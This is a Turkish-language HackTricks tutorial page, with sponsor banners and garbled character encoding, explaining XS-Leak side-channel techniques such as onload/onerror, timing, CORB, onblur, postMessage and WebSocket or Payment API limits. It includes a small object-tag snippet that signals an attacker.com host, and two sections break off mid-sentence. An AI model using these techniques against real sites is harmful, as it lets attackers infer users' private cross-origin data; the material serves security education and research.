# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'ler**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github reposuna PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **Ã§apraz kaynak bilgilerini** Ã§Ä±karmak iÃ§in kullanÄ±lan bir yÃ¶ntemdir.

Bu saldÄ±rÄ±da yer alan temel bileÅŸenler ÅŸunlardÄ±r:

* **ZayÄ±f Web**: Bilgilerin Ã§Ä±karÄ±lmasÄ± amaÃ§lanan hedef web sitesi.
* **SaldÄ±rganÄ±n Web'i**: SaldÄ±rgan tarafÄ±ndan oluÅŸturulan kÃ¶tÃ¼ niyetli web sitesi, kurbanÄ±n ziyaret ettiÄŸi ve saldÄ±rÄ±yÄ± barÄ±ndÄ±ran.
* **Dahil Etme YÃ¶ntemi**: ZayÄ±f Web'i SaldÄ±rganÄ±n Web'ine dahil etmek iÃ§in kullanÄ±lan teknik (Ã¶rneÄŸin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **SÄ±zÄ±ntÄ± TekniÄŸi**: Dahil etme yÃ¶ntemi aracÄ±lÄ±ÄŸÄ±yla toplanan bilgilere dayanarak ZayÄ±f Web'in durumu arasÄ±ndaki farklarÄ± ayÄ±rt etmek iÃ§in kullanÄ±lan teknikler.
* **Durumlar**: SaldÄ±rganÄ±n ayÄ±rt etmeyi amaÃ§ladÄ±ÄŸÄ± ZayÄ±f Web'in iki potansiyel durumu.
* **AyÄ±rt Edilebilir Farklar**: SaldÄ±rganÄ±n ZayÄ±f Web'in durumunu Ã§Ä±karÄ±m yapmak iÃ§in gÃ¼vendiÄŸi gÃ¶zlemlenebilir farklÄ±lÄ±klar.

### AyÄ±rt Edilebilir Farklar

ZayÄ±f Web'in durumlarÄ±nÄ± ayÄ±rt etmek iÃ§in birkaÃ§ yÃ¶n incelenebilir:

* **Durum Kodu**: Ã‡apraz kaynakta **Ã§eÅŸitli HTTP yanÄ±t durum kodlarÄ±** arasÄ±ndaki farkÄ± ayÄ±rt etmek, sunucu hatalarÄ±, istemci hatalarÄ± veya kimlik doÄŸrulama hatalarÄ± gibi.
* **API KullanÄ±mÄ±**: Sayfalar arasÄ±nda **Web API'lerinin kullanÄ±mÄ±nÄ±** belirlemek, Ã§apraz kaynak sayfasÄ±nÄ±n belirli bir JavaScript Web API'sini kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± ortaya Ã§Ä±karÄ±r.
* **YÃ¶nlendirmeler**: YalnÄ±zca HTTP yÃ¶nlendirmeleri deÄŸil, JavaScript veya HTML tarafÄ±ndan tetiklenen farklÄ± sayfalara yapÄ±lan gezinmeleri tespit etmek.
* **Sayfa Ä°Ã§eriÄŸi**: HTTP yanÄ±t gÃ¶vdesindeki veya sayfa alt kaynaklarÄ±nda (gÃ¶mÃ¼lÃ¼ Ã§erÃ§evelerin sayÄ±sÄ± veya gÃ¶rÃ¼ntÃ¼lerdeki boyut farklÄ±lÄ±klarÄ± gibi) deÄŸiÅŸikliklerin gÃ¶zlemlenmesi.
* **HTTP BaÅŸlÄ±ÄŸÄ±**: Belirli bir HTTP yanÄ±t baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± veya olasÄ± deÄŸerini (X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi baÅŸlÄ±klar) belirlemek.
* **Zamanlama**: Ä°ki durum arasÄ±ndaki tutarlÄ± zaman farklarÄ±nÄ± fark etmek.

### Dahil Etme YÃ¶ntemleri

* **HTML Ã–ÄŸeleri**: HTML, stil sayfalarÄ±, gÃ¶rÃ¼ntÃ¼ler veya betikler gibi **Ã§apraz kaynak kaynaÄŸÄ± dahil etme** iÃ§in Ã§eÅŸitli Ã¶ÄŸeler sunar, tarayÄ±cÄ±nÄ±n bir HTML olmayan kaynaÄŸÄ± istemesini saÄŸlar. Bu amaÃ§la potansiyel HTML Ã¶ÄŸelerinin bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Ã‡erÃ§eveler**: **iframe**, **object** ve **embed** gibi Ã¶ÄŸeler, HTML kaynaklarÄ±nÄ± doÄŸrudan saldÄ±rganÄ±n sayfasÄ±na yerleÅŸtirir. Sayfa **Ã§erÃ§eve korumasÄ± eksikse**, JavaScript, Ã§erÃ§evelenmiÅŸ kaynaÄŸÄ±n pencere nesnesine contentWindow Ã¶zelliÄŸi aracÄ±lÄ±ÄŸÄ±yla eriÅŸebilir.
* **AÃ§Ä±lÄ±r Pencereler**: **`window.open`** yÃ¶ntemi, JavaScript'in SOP'yi takip eden yÃ¶ntemler ve Ã¶zelliklerle etkileÅŸimde bulunabilmesi iÃ§in bir kaynaÄŸÄ± yeni bir sekmede veya pencerede aÃ§ar. AÃ§Ä±lÄ±r pencereler, genellikle tek oturum aÃ§ma iÅŸleminde kullanÄ±lÄ±r ve hedef kaynaÄŸÄ±n Ã§erÃ§eveleme ve Ã§erez kÄ±sÄ±tlamalarÄ±nÄ± atlar. Bununla birlikte, modern tarayÄ±cÄ±lar aÃ§Ä±lÄ±r pencere oluÅŸturmayÄ± belirli kullanÄ±cÄ± eylemlerine sÄ±nÄ±rlar.
* **JavaScript Ä°stekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doÄŸrudan istekler yapabilir. Bu yÃ¶ntemler, HTTP yÃ¶nlendirmelerini takip etme gibi isteÄŸe tam kontrol saÄŸlar.

### SÄ±zÄ±ntÄ± Teknikleri

* **Olay Ä°ÅŸleyici**: XS-Leaks'te klasik bir sÄ±zÄ±ntÄ± tekniÄŸi olan olay iÅŸleyicileri (**onload** ve **onerror** gibi), kaynak yÃ¼kleme baÅŸarÄ±sÄ± veya baÅŸarÄ±sÄ±zlÄ±ÄŸÄ± hakkÄ±nda bilgi saÄŸlar.
* **Hata MesajlarÄ±**: JavaScript istisnalarÄ± veya Ã¶zel hata sayfalarÄ±, hata mesajÄ±nÄ±n kendisinden veya varlÄ±ÄŸÄ± ve yokluÄŸu arasÄ±ndaki farktan kaynak sÄ±zÄ±ntÄ±sÄ± bilgisi saÄŸlayabilir.
* **Genel SÄ±nÄ±rlar**: TarayÄ±cÄ±nÄ±n bellek kapasitesi veya diÄŸer zorunlu tarayÄ±cÄ± sÄ±nÄ±rlamalarÄ± gibi tarayÄ±cÄ±nÄ±n fiziksel sÄ±nÄ±rlamalarÄ±, bir eÅŸik noktasÄ±na ulaÅŸÄ±ldÄ±ÄŸÄ±nda sÄ±zÄ±ntÄ± tekniÄŸi olarak hizmet edebilir.
* **Genel Durum**: TarayÄ±cÄ±larÄ±n **genel durumlarÄ±yla** (Ã¶rneÄŸin, GeÃ§miÅŸ arabirimi) tespit edilebilir etkileÅŸimler sÃ¶mÃ¼rÃ¼lebilir. Ã–rneÄŸin, bir tarayÄ±cÄ±nÄ±n geÃ§miÅŸindeki giriÅŸlerin sayÄ±sÄ±, Ã§apraz kaynak sayfalarÄ± hakkÄ±nda ipuÃ§larÄ± sunabilir.
* **Performans API'si**: Bu API, mevcut sayfanÄ±n performans ayrÄ±ntÄ±larÄ±nÄ±, belge ve yÃ¼klenen kaynaklar iÃ§in aÄŸ zamanlamasÄ±nÄ± iÃ§eren performans ayrÄ±ntÄ±larÄ± saÄŸlar, istenen kaynaklar hakkÄ±nda Ã§Ä±karÄ±mlar yapmayÄ± saÄŸlar.
* **Okunabilir Ã–znitelikler**: BazÄ± HTML Ã¶znitelikleri **Ã§apraz kaynakta okunabilir** ve sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±labilir. Ã–rneÄŸin, `window.frame.length` Ã¶zelliÄŸi, bir web sayfasÄ±nda yer alan Ã§erÃ§eveleri saymak iÃ§in JavaScript'in kullanÄ±lmasÄ±na olanak tanÄ±r.

## XSinator AracÄ± ve Makale

XSinator, **birkaÃ§ bilinen XS-Leaks'e karÅŸÄ± tarayÄ±cÄ±larÄ± kontrol etmek iÃ§in otomatik bir araÃ§tÄ±r** ve makalesiyle aÃ§Ä±klanmÄ±ÅŸtÄ±r: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

AraÃ§a [https://xsinator.com/](https://xsinator.com/) adresinden **eriÅŸebilirsiniz**

{% hint style="warning" %}
**DÄ±ÅŸlanan XS-Leaks**: XSinator'da diÄŸer sÄ±zÄ±nt
## **Zamanlama TabanlÄ± Teknikler**

AÅŸaÄŸÄ±daki tekniklerin bazÄ±larÄ±, web sayfalarÄ±nÄ±n olasÄ± durumlarÄ±ndaki farklÄ±lÄ±klarÄ± tespit etmek iÃ§in sÃ¼reyi kullanacak. Bir web tarayÄ±cÄ±sÄ±nda zamanÄ± Ã¶lÃ§menin farklÄ± yollarÄ± vardÄ±r.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliÅŸtiricilere yÃ¼ksek Ã§Ã¶zÃ¼nÃ¼rlÃ¼klÃ¼ zaman Ã¶lÃ§Ã¼mleri almayÄ± saÄŸlar.\
SaldÄ±rganlarÄ±n zÄ±mni saatler oluÅŸturmak iÃ§in istismar edebileceÄŸi Ã¶nemli sayÄ±da API bulunmaktadÄ±r: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonlarÄ± ve diÄŸerleri.\
Daha fazla bilgi iÃ§in: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay Ä°ÅŸleyici Teknikleri

### Onload/Onerror

* **Dahil Etme YÃ¶ntemleri**: Frames, HTML Elementleri
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Ã–zet**: Bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±rken onerror/onload olaylarÄ±, kaynak baÅŸarÄ±yla/baÅŸarÄ±sÄ±z bir ÅŸekilde yÃ¼klendiÄŸinde durum kodunu belirlemek mÃ¼mkÃ¼ndÃ¼r.
* **Ã–rnek kod**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Ã–rnek kod, **JS'den script nesneleri yÃ¼klemeyi** deniyor, ancak nesneler, stil sayfalarÄ±, resimler, sesler gibi **diÄŸer etiketler** de kullanÄ±labilir. DahasÄ±, etiketi doÄŸrudan enjekte etmek ve etiketin iÃ§inde `onload` ve `onerror` olaylarÄ±nÄ± bildirmek de mÃ¼mkÃ¼ndÃ¼r (JS'den enjekte etmek yerine).

Bu saldÄ±rÄ±nÄ±n ayrÄ±ca script olmayan bir versiyonu da vardÄ±r:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, `example.com/404` bulunamazsa `attacker.com/?error` yÃ¼klenecektir.

### Onload Zamanlama

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Ã–zet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**, bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar sÃ¼re gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. Bununla birlikte, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diÄŸer saatler de kullanÄ±labilir, bu saatler 50 ms'den daha uzun sÃ¼ren gÃ¶revleri tanÄ±mlayabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) baÅŸka bir Ã¶rnek:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu AÄŸÄ±r GÃ¶rev

Bu teknik, Ã¶ncekiyle aynÄ±dÄ±r, ancak **saldÄ±rgan**, **cevap olumlu veya olumsuz olduÄŸunda** biraz zaman alacak bir **ilgili eylem** de **zorlar** ve bu sÃ¼reyi Ã¶lÃ§er.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Ã–zet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar sÃ¼re gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynaÄŸÄ±n alÄ±nmasÄ± iÃ§in geÃ§en sÃ¼re, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) olaylarÄ±nÄ± kullanarak Ã¶lÃ§Ã¼lebilir. **`beforeunload`** olayÄ±, tarayÄ±cÄ±nÄ±n yeni bir sayfaya yÃ¶nlendirmek Ã¼zere olduÄŸu zaman tetiklenirken, **`unload`** olayÄ± navigasyon gerÃ§ekleÅŸtiÄŸinde meydana gelir. Bu iki olay arasÄ±ndaki zaman farkÄ±, tarayÄ±cÄ±nÄ±n kaynaÄŸÄ± almak iÃ§in harcadÄ±ÄŸÄ± sÃ¼reyi belirlemek iÃ§in hesaplanabilir.

### Sandboxed Frame Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Ã–zet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API, bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar sÃ¼re gerektiÄŸini Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadÄ±ÄŸÄ±nda, bir sayfanÄ±n ve alt kaynaklarÄ±nÄ±n aÄŸ Ã¼zerinden yÃ¼klenmesi iÃ§in gereken sÃ¼re bir saldÄ±rgan tarafÄ±ndan Ã¶lÃ§Ã¼lebilir. Bu Ã¶lÃ§Ã¼m genellikle bir iframe'in `onload` iÅŸleyicisi, kaynak yÃ¼kleme ve JavaScript yÃ¼rÃ¼tmesinin tamamlanmasÄ±ndan sonra tetiklenir. Betik yÃ¼rÃ¼tme tarafÄ±ndan tanÄ±tÄ±lan deÄŸiÅŸkenliÄŸi atlatmak iÃ§in, bir saldÄ±rgan `<iframe>` iÃ§inde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) Ã¶zniteliÄŸini kullanabilir. Bu Ã¶zniteliÄŸin eklenmesi, JavaScript'in yÃ¼rÃ¼tÃ¼lmesi de dahil olmak Ã¼zere birÃ§ok iÅŸlevin kÄ±sÄ±tlanmasÄ±nÄ± saÄŸlar ve bu da Ã¶lÃ§Ã¼mÃ¼n Ã§oÄŸunlukla aÄŸ performansÄ±ndan etkilenen bir Ã¶lÃ§Ã¼m yapÄ±lmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + hata + onload

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**:
* **Ã–zet**: DoÄŸru iÃ§eriÄŸe eriÅŸildiÄŸinde sayfada hata oluÅŸturabilir ve herhangi bir iÃ§erik eriÅŸildiÄŸinde doÄŸru ÅŸekilde yÃ¼klenmesini saÄŸlayabilirseniz, zamanÄ± Ã¶lÃ§meden tÃ¼m bilgileri Ã§Ä±karmak iÃ§in bir dÃ¶ngÃ¼ oluÅŸturabilirsiniz.
* **Ã–rnek Kod**:

VarsayalÄ±m ki **gizli** iÃ§eriÄŸe sahip olan **sayfayÄ± Iframe iÃ§ine ekleyebilirsiniz**.

KurbanÄ±n "_**flag**_" iÃ§eren bir dosyayÄ± aramasÄ±nÄ± saÄŸlayabilirsiniz, Ã¶rneÄŸin bir CSRF'yi kullanarak bir **Iframe** iÃ§inde (exploit). Iframe iÃ§inde, _**onload etkinliÄŸi**_ her zaman en az bir kez **yÃ¼rÃ¼tÃ¼lecektir**. ArdÄ±ndan, URL'nin iÃ§indeki **hash**'in sadece **iÃ§eriÄŸini deÄŸiÅŸtirerek** Iframe'Ä±n **URL**'sini **deÄŸiÅŸtirebilirsiniz**.

Ã–rneÄŸin:

1. **URL1**: www.saldÄ±rgan.com/xssearch#try1
2. **URL2**: www.saldÄ±rgan.com/xssearch#try2

Ä°lk URL **baÅŸarÄ±yla yÃ¼klendi** ise, URL'nin **hash** kÄ±smÄ±nÄ± deÄŸiÅŸtirdiÄŸinizde **onload** etkinliÄŸi **tekrar tetiklenmeyecektir**. Ancak sayfa yÃ¼klenirken bir tÃ¼r **hata** oluÅŸtuysa, **onload** etkinliÄŸi **tekrar tetiklenecektir**.

Bu ÅŸekilde, **doÄŸru** yÃ¼klenen bir sayfa ile eriÅŸilen bir **hata** iÃ§eren sayfa arasÄ±nda ayrÄ±m yapabilirsiniz.

### Javascript YÃ¼rÃ¼tme

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**:
* **Ã–zet**: Sayfa, **duyarlÄ±** iÃ§eriÄŸi **geri dÃ¶ndÃ¼rÃ¼yorsa** veya kullanÄ±cÄ± tarafÄ±ndan **kontrol edilebilen** bir **iÃ§erik** dÃ¶ndÃ¼rÃ¼yorsa, kullanÄ±cÄ± **negatif durumda geÃ§erli JS kodunu** ayarlayabilir ve her denemeyi **`<script>`** etiketleri iÃ§inde yÃ¼kleyebilir, bÃ¶ylece **negatif** durumlarda saldÄ±rganlarÄ±n **kodu yÃ¼rÃ¼tÃ¼lÃ¼r**, **olumlu** durumlarda ise **hiÃ§bir ÅŸey** yÃ¼rÃ¼tÃ¼lmez.
* **Ã–rnek Kod**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Ekleme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Durum Kodu ve BaÅŸlÄ±klar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Ã–zet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldÄ±rÄ±lara karÅŸÄ± koruma saÄŸlamak iÃ§in web sayfalarÄ±nÄ±n belirli hassas cross-origin kaynaklarÄ± yÃ¼klemesini engelleyen bir gÃ¼venlik Ã¶nlemidir. Bununla birlikte, saldÄ±rganlar koruyucu davranÄ±ÅŸÄ±nÄ± istismar edebilir. **CORB**'a tabi bir yanÄ±t, `Content-Type`'da **CORB korumalÄ±** bir deÄŸerle `nosniff` ve `2xx` durum kodu dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nde, **CORB**, yanÄ±tÄ±n gÃ¶vdesini ve baÅŸlÄ±klarÄ±nÄ± kaldÄ±rÄ±r. Bunu gÃ¶zlemleyen saldÄ±rganlar, **durum kodu** (baÅŸarÄ± veya hata gÃ¶steren) ve `Content-Type`'Ä±n (CORB tarafÄ±ndan korunup korunmadÄ±ÄŸÄ±nÄ± belirten) kombinasyonunu Ã§Ä±karabilir ve potansiyel bilgi sÄ±zÄ±ntÄ±sÄ±na yol aÃ§abilir.
* **Ã–rnek Kod**:

SaldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in daha fazla bilgi baÄŸlantÄ±sÄ±na bakÄ±n.

### onblur

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Ã–zet**: ID veya name Ã¶zniteliÄŸinden hassas veri sÄ±zdÄ±rma.
* **Ã–rnek Kod**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir sayfayÄ± bir **iframe** iÃ§ine yÃ¼klemek ve sayfanÄ±n **`#id_deÄŸeri`** ile iframe'Ä±n Ã¶ÄŸesine odaklanmasÄ±nÄ± saÄŸlamak mÃ¼mkÃ¼ndÃ¼r, ardÄ±ndan **`onblur`** sinyali tetiklendiÄŸinde ID Ã¶ÄŸesi var demektir.\
AynÄ± saldÄ±rÄ±yÄ± **`portal`** etiketleriyle gerÃ§ekleÅŸtirebilirsiniz.

### postMessage YayÄ±nlarÄ± <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Ekleme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Ã–zet**: postMessage'dan hassas bilgileri toplamak veya postMessage'Ä±n varlÄ±ÄŸÄ±nÄ± bir oracle olarak kullanarak kullanÄ±cÄ±nÄ±n sayfadaki durumunu bilmek.
* **Ã–rnek Kod**: `TÃ¼m postMessage'larÄ± dinleyen herhangi bir kod.`

Uygulamalar genellikle farklÄ± kÃ¶kenler arasÄ±nda iletiÅŸim kurmak iÃ§in [`postMessage` yayÄ±nlarÄ±nÄ±](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanÄ±r. Ancak, hedef kÃ¶ken parametresi doÄŸru ÅŸekilde belirtilmezse, bu yÃ¶ntem yanlÄ±ÅŸlÄ±kla **hassas bilgileri** ortaya Ã§Ä±karabilir ve herhangi bir pencerenin mesajlarÄ± almasÄ±na izin verebilir. AyrÄ±ca, bir mesaj almanÄ±n tek baÅŸÄ±na bir **oracle** olarak iÅŸlev gÃ¶rebilir; Ã¶rneÄŸin, belirli mesajlar yalnÄ±zca oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±lara gÃ¶nderilebilir. Bu nedenle, bu mesajlarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, kullanÄ±cÄ±nÄ±n durumu veya kimliÄŸi hakkÄ±nda bilgi verebilir, Ã¶rneÄŸin kimlik doÄŸrulamasÄ±nÄ±n yapÄ±ldÄ±ÄŸÄ± veya yapÄ±lmadÄ±ÄŸÄ± gibi.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





En geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturmanÄ±za ve otomatikleÅŸtirmenize olanak saÄŸlayan [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Global SÄ±nÄ±rlar Teknikleri

### WebSocket API

* **Ekleme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Ã–zet**: WebSocket baÄŸlantÄ± sÄ±nÄ±rÄ±nÄ± tÃ¼ketmek, Ã§apraz kÃ¶kenli bir sayfanÄ±n WebSocket baÄŸlantÄ±larÄ±nÄ±n sayÄ±sÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanÄ±n kaÃ§ tane WebSocket baÄŸlantÄ±sÄ± kullandÄ±ÄŸÄ±nÄ± ve nasÄ±l kullandÄ±ÄŸÄ±nÄ± belirlemek mÃ¼mkÃ¼ndÃ¼r. Bu, saldÄ±rganÄ±n uygulama durumlarÄ±nÄ± tespit etmesine ve WebSocket baÄŸlantÄ± sayÄ±sÄ±yla iliÅŸkili bilgileri sÄ±zdÄ±rmasÄ±na olanak tanÄ±r.

Bir **kÃ¶ken**, baÄŸlantÄ±larÄ±n durumlarÄ±na bakÄ±lmaksÄ±zÄ±n, **maksimum miktarda WebSocket** baÄŸlantÄ± nesnesini kullandÄ±ÄŸÄ±nda, yeni nesnelerin oluÅŸturulmasÄ± **JavaScript istisn
### Ã–deme API'si

* **Dahil Etme YÃ¶ntemleri**: Frames, Pop-up'lar
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Ã–zet**: Sadece bir tane etkin Ã¶deme isteÄŸi olabileceÄŸinden Ã¶deme isteÄŸini algÄ±layÄ±n.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

